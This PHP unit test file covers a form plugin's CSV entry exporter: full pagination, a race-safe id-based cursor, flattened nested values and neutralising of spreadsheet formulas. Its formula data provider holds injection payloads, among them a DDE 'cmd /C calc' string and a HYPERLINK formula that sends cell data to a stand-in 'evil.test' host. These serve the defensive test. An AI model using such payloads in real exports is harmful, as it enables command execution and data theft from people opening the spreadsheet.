<?php
/**
 * CSV export of form entries.
 *
 * Three separate defects met in the old exporter: it asked for entries with
 * the default query arguments and so silently stopped at 20 rows, it handed
 * whole entry arrays to fputcsv() so nested values became the literal word
 * "Array", and it wrote cell values verbatim so a submitted "=..." string
 * became a live formula when the file was opened in a spreadsheet.
 *
 * @package Formtura
 */

namespace Formtura\Tests\Unit\Admin;

use Formtura\Admin\Entry_Export;
use Formtura\Tests\TestCase;

class EntryExportTest extends TestCase {

	/**
	 * Parse generated CSV back into rows.
	 *
	 * @param string $csv CSV text.
	 * @return array[]
	 */
	private function rows( $csv ) {
		$handle = fopen( 'php://temp', 'r+' );
		fwrite( $handle, $csv );
		rewind( $handle );

		$rows = [];

		while ( false !== ( $row = fgetcsv( $handle ) ) ) {
			$rows[] = $row;
		}

		fclose( $handle );

		return $rows;
	}

	/**
	 * One entry in the shape Entries_DB::get_by_form() returns.
	 *
	 * @param int   $id   Entry ID.
	 * @param array $data Field data.
	 * @return array
	 */
	private function entry( $id, array $data ) {
		return [
			'id'         => $id,
			'form_id'    => 7,
			'user_id'    => 0,
			'ip_address' => '203.0.113.9',
			'user_agent' => 'Mozilla/5.0',
			'is_read'    => false,
			'created_at' => '2026-08-15 09:30:00',
			'data'       => $data,
		];
	}

	private function form() {
		return [
			'id'     => 7,
			'fields' => [
				[ 'id' => 'field_1', 'type' => 'text', 'label' => 'Your name' ],
				[ 'id' => 'field_2', 'type' => 'checkbox', 'label' => 'Sizes' ],
			],
		];
	}

	private function exporter( $entries = null ) {
		return new Entry_Export( $entries );
	}

	public function test_empty_entry_sets_produce_no_csv() {
		$this->assertSame( '', $this->exporter()->csv( [] ) );
	}

	public function test_header_uses_field_labels_from_the_form() {
		$csv = $this->exporter()->csv(
			[ $this->entry( 1, [ 'field_1' => 'Ada', 'field_2' => [ 'S', 'L' ] ] ) ],
			$this->form()
		);

		$header = $this->rows( $csv )[0];

		$this->assertContains( 'Your name', $header );
		$this->assertContains( 'Sizes', $header );
	}

	/**
	 * Headers were taken from the first entry alone, so a field only some
	 * entries carry - a conditional field, or one added later - lost its
	 * column and its values silently shifted into the wrong ones.
	 */
	public function test_header_covers_every_field_seen_across_all_entries() {
		$csv = $this->exporter()->csv(
			[
				$this->entry( 1, [ 'field_1' => 'Ada' ] ),
				$this->entry( 2, [ 'field_1' => 'Grace', 'field_2' => [ 'S' ] ] ),
			],
			$this->form()
		);

		$rows = $this->rows( $csv );

		$this->assertContains( 'Sizes', $rows[0] );
		$this->assertCount( count( $rows[0] ), $rows[1] );
		$this->assertCount( count( $rows[0] ), $rows[2] );
	}

	public function test_values_line_up_under_their_own_column() {
		$csv = $this->exporter()->csv(
			[
				$this->entry( 1, [ 'field_2' => [ 'S' ] ] ),
				$this->entry( 2, [ 'field_1' => 'Grace' ] ),
			],
			$this->form()
		);

		$rows  = $this->rows( $csv );
		$name  = array_search( 'Your name', $rows[0], true );
		$sizes = array_search( 'Sizes', $rows[0], true );

		$this->assertSame( '', $rows[1][ $name ] );
		$this->assertSame( 'S', $rows[1][ $sizes ] );
		$this->assertSame( 'Grace', $rows[2][ $name ] );
		$this->assertSame( '', $rows[2][ $sizes ] );
	}

	public function test_nested_values_are_flattened_not_written_as_array() {
		$csv = $this->exporter()->csv(
			[
				$this->entry(
					1,
					[
						'field_1' => 'Ada',
						'field_2' => [ 'Small', 'Large' ],
					]
				),
			],
			$this->form()
		);

		$this->assertStringNotContainsString( 'Array', $csv );
		$this->assertContains( 'Small, Large', $this->rows( $csv )[1] );
	}

	public function test_entry_metadata_columns_are_included() {
		$csv    = $this->exporter()->csv( [ $this->entry( 12, [ 'field_1' => 'Ada' ] ) ], $this->form() );
		$rows   = $this->rows( $csv );
		$header = $rows[0];

		$this->assertSame( 'Entry ID', $header[0] );
		$this->assertSame( '12', $rows[1][0] );
		$this->assertContains( '2026-08-15 09:30:00', $rows[1] );
		$this->assertContains( 'Unread', $rows[1] );
		$this->assertContains( '203.0.113.9', $rows[1] );
	}

	/**
	 * A spreadsheet evaluates a cell that opens with =, +, - or @ as a
	 * formula, so a submitted string can run a command or exfiltrate the
	 * sheet when an administrator opens the export.
	 *
	 * @dataProvider formulaProvider
	 */
	public function test_formula_cells_are_neutralised( $submitted ) {
		$csv = $this->exporter()->csv( [ $this->entry( 1, [ 'field_1' => $submitted ] ) ], $this->form() );

		$cell = $this->rows( $csv )[1][ array_search( 'Your name', $this->rows( $csv )[0], true ) ];

		$this->assertSame( "'" . $submitted, $cell );
	}

	public function formulaProvider() {
		return [
			'equals'      => [ '=1+1' ],
			'plus'        => [ '+1+1' ],
			'at'          => [ '@SUM(A1:A9)' ],
			'minus'       => [ '-2+3+cmd|\' /C calc\'!A0' ],
			'hyperlink'   => [ '=HYPERLINK("http://evil.test?v="&A1,"Click")' ],
			'leading tab' => [ "\t=1+1" ],
		];
	}

	/**
	 * The neutralising prefix must not turn ordinary numeric answers - a
	 * negative amount, a signed rating - into text in every spreadsheet.
	 */
	public function test_ordinary_numbers_are_left_alone() {
		$csv  = $this->exporter()->csv( [ $this->entry( 1, [ 'field_1' => '-5.25' ] ) ], $this->form() );
		$rows = $this->rows( $csv );

		$this->assertSame( '-5.25', $rows[1][ array_search( 'Your name', $rows[0], true ) ] );
	}

	public function test_a_field_label_that_looks_like_a_formula_is_neutralised() {
		$form = [
			'id'     => 7,
			'fields' => [ [ 'id' => 'field_1', 'type' => 'text', 'label' => '=1+1' ] ],
		];

		$csv = $this->exporter()->csv( [ $this->entry( 1, [ 'field_1' => 'Ada' ] ) ], $form );

		$this->assertContains( "'=1+1", $this->rows( $csv )[0] );
	}

	public function test_payment_orders_are_exported_as_a_column() {
		$csv = $this->exporter()->csv(
			[
				$this->entry(
					1,
					[
						'field_1'  => 'Ada',
						'_payment' => [
							'amount'   => 40.0,
							'currency' => 'USD',
							'items'    => [ [ 'label' => 'Ticket', 'price' => 40.0 ] ],
							'coupon'   => null,
						],
					]
				),
			],
			$this->form()
		);

		$rows = $this->rows( $csv );

		$this->assertContains( 'Payment', $rows[0] );
		$this->assertContains( 'USD 40.00 - Ticket (40.00)', $rows[1] );
	}

	/**
	 * The headline defect: fta_get_entries() defaults to 20 rows, so every
	 * export of a busy form quietly discarded everything past the first page.
	 */
	public function test_every_entry_is_exported_not_just_the_first_page() {
		$source = $this->entrySource( 205 );

		$rows = $this->rows( $this->exporter( $source )->for_form( 7, $this->form() ) );

		// One header row plus every entry.
		$this->assertCount( 206, $rows );
	}

	public function test_paging_stops_once_the_source_is_exhausted() {
		$source = $this->entrySource( 30 );

		$this->exporter( $source )->for_form( 7, $this->form() );

		$this->assertLessThanOrEqual( 3, $source->calls );
	}

	/**
	 * OFFSET paging skips whatever a concurrent insert pushes across the page
	 * boundary while a multi-page export is in progress: an insert landing
	 * ahead of the cursor shifts every existing row down by one, so the next
	 * OFFSET-based page starts one row later than it should and silently
	 * drops the row that shift pushed across it. Seeking from the id of the
	 * last row actually read has nothing to skip - it is unaffected by rows
	 * inserted anywhere else.
	 */
	public function test_an_entry_arriving_mid_export_does_not_cause_a_row_to_be_skipped() {
		// Larger than Entry_Export::BATCH_SIZE, so the export needs a second
		// page and the insert - timed for right after the first page is
		// read - actually lands between two paging calls.
		$source = $this->raceProneSource( 250, 1 );

		$rows = $this->rows( $this->exporter( $source )->for_form( 7, $this->form() ) );

		// One header row plus the 250 entries that existed when the export
		// began - the entry inserted mid-export is not expected to appear,
		// but nothing that existed at the start should be missing.
		$this->assertCount( 251, $rows );

		$ids = array_column( array_slice( $rows, 1 ), 0 );
		$this->assertEqualsCanonicalizing( range( 1, 250 ), array_map( 'intval', $ids ) );
	}

	/**
	 * An entries source holding a fixed number of entries, which honours the
	 * page/per_page arguments the exporter pages with.
	 *
	 * @param int $total Entries to serve.
	 * @return object
	 */
	private function entrySource( $total ) {
		$entries = [];

		for ( $i = 1; $i <= $total; $i++ ) {
			$entries[] = $this->entry( $i, [ 'field_1' => 'Visitor ' . $i ] );
		}

		// Newest first, matching Entries_DB's default ORDER BY created_at
		// DESC, id DESC - required for the after_id branch below to behave
		// like the real query.
		$entries = array_reverse( $entries );

		return new class( $entries ) {
			public $calls = 0;
			private $entries;

			public function __construct( $entries ) {
				$this->entries = $entries;
			}

			public function get_by_form( $form_id, $args = [] ) {
				$this->calls++;

				$per_page = isset( $args['per_page'] ) ? (int) $args['per_page'] : 20;

				if ( isset( $args['after_id'] ) ) {
					$after = (int) $args['after_id'];

					$remaining = array_values(
						array_filter(
							$this->entries,
							static function ( $entry ) use ( $after ) {
								return $entry['id'] < $after;
							}
						)
					);

					return array_slice( $remaining, 0, $per_page );
				}

				$page = isset( $args['page'] ) ? max( 1, (int) $args['page'] ) : 1;

				return array_slice( $this->entries, ( $page - 1 ) * $per_page, $per_page );
			}
		};
	}

	/**
	 * An entries source ordered newest-first (descending id, matching the
	 * database's default order) that inserts one new row - simulating a
	 * visitor submitting mid-export - the call after the given one.
	 *
	 * @param int $total          Entries that exist when the export starts.
	 * @param int $insert_after_call Number of get_by_form() calls to serve
	 *        before the new entry lands.
	 * @return object
	 */
	private function raceProneSource( $total, $insert_after_call ) {
		$entries = [];

		for ( $i = 1; $i <= $total; $i++ ) {
			$entries[] = $this->entry( $i, [ 'field_1' => 'Visitor ' . $i ] );
		}

		// Newest first, matching Entries_DB's default ORDER BY created_at
		// DESC, id DESC.
		$entries = array_reverse( $entries );

		$latecomer = [
			'id'         => 999,
			'form_id'    => 7,
			'user_id'    => 0,
			'ip_address' => '203.0.113.9',
			'user_agent' => 'Mozilla/5.0',
			'is_read'    => false,
			'created_at' => '2026-08-15 09:30:01',
			'data'       => [ 'field_1' => 'Latecomer' ],
		];

		return new class( $entries, $insert_after_call, $latecomer ) {
			public $calls = 0;
			private $entries;
			private $insert_after_call;
			private $latecomer;

			public function __construct( $entries, $insert_after_call, $latecomer ) {
				$this->entries           = $entries;
				$this->insert_after_call = $insert_after_call;
				$this->latecomer         = $latecomer;
			}

			public function get_by_form( $form_id, $args = [] ) {
				$this->calls++;

				$per_page = isset( $args['per_page'] ) ? (int) $args['per_page'] : 20;

				if ( isset( $args['after_id'] ) ) {
					$after = (int) $args['after_id'];

					$remaining = array_values(
						array_filter(
							$this->entries,
							static function ( $entry ) use ( $after ) {
								return $entry['id'] < $after;
							}
						)
					);

					$result = array_slice( $remaining, 0, $per_page );
				} else {
					// OFFSET paging: a plain slice from the front of whatever
					// the list looks like right now, which is exactly what
					// makes it race-prone.
					$page = isset( $args['page'] ) ? max( 1, (int) $args['page'] ) : 1;

					$result = array_slice( $this->entries, ( $page - 1 ) * $per_page, $per_page );
				}

				if ( $this->calls === $this->insert_after_call ) {
					// A new entry arrives right after this page was read,
					// newest-first means it lands at the front of the result
					// set - ahead of every row not yet paged through.
					array_unshift( $this->entries, $this->latecomer );
				}

				return $result;
			}
		};
	}
}
